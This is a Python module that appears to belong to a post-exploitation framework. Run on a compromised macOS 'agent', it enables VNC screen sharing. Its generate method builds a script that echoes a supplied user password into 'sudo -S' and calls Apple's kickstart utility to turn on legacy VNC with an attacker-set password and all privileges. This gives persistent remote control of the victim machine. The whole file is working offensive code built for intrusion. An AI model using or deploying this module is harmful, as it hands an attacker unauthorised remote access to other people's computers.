from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'ScreenSharing',
            'Author': ['@n00py'],
            'Description': ('Enables ScreenSharing to allow you to connect to the host via VNC.'),
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ['https://www.unix-ninja.com/p/Enabling_macOS_screen_sharing_VNC_via_command_line']
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'User password for sudo.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'VNCpass' : {
                'Description'   :   'Password to use for VNC',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        password = self.options['Password']['Value']
        vncpass = self.options['VNCpass']['Value']
        enable = "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw %s -restart -agent -privs -all"  % (vncpass)
        script = 'import subprocess; subprocess.Popen("echo \\"%s\\" | sudo -S %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)' % (password, enable)
        return script